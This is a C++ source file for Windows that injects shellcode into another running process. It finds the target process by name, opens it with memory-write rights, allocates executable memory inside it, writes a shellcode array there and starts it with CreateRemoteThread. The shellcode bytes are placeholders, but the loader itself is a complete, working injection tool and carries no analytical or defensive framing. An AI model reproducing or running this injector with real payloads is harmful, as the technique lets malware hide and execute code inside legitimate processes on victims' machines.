#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <cwchar>
#include <cstring>
#include <cwchar> 
using namespace std;


unsigned char shellcode[] = { 0x90, 0x91, 0x94 };

unsigned shellcodelength = sizeof(shellcode);

DWORD findProcessID(const wchar_t* processName) {
	DWORD processID = 0;
	HANDLE allProcessRunning = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (allProcessRunning == INVALID_HANDLE_VALUE) {
		cerr<< "Invalid handle, could not get snapshot of running process";
		return 0;
	}
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(allProcessRunning, &pe)) {
		do {
			if (wcscmp(pe.szExeFile, processName) == 0){
				processID = pe.th32ProcessID;
				break;
			}
		} while (Process32Next(allProcessRunning, &pe));
	}

	CloseHandle(allProcessRunning);
	return processID;
}

int main(int argc, char* argv[]) {
	
	if ( argc < 2) {
		cout << " PLease enter the program you are looking for ";
		return 1;

	}
	
	wchar_t targetProgram[260];
	
 
	mbstowcs_s(0, targetProgram, 260, argv[1], _TRUNCATE);
		
	DWORD processID = findProcessID(targetProgram);

	if (processID == 0) {
		cerr << "Could not find the target process." << endl;
		return 1;
	}
	HANDLE targetProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE  | PROCESS_VM_OPERATION , 0, processID);
	
	if (targetProcess == NULL) {
		cout << "Couldnt open process";
		return 1;
	}
	cout << "Opened process succesffully";
	// Allocating memory in the target process
	LPVOID  allocMem = VirtualAllocEx(targetProcess, 0, shellcodelength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (allocMem == NULL) {
		cout << "Could not allocate memory";
		return 1;
	}
	// Writing into the memory allocating 
	if (!WriteProcessMemory(targetProcess, allocMem, shellcode, shellcodelength, NULL)) {

		return 1;
	}

	HANDLE remoteThead = CreateRemoteThread(targetProcess, NULL, 0, (LPTHREAD_START_ROUTINE)allocMem, NULL, 0, NULL);

	 
	CloseHandle(targetProcess);

}
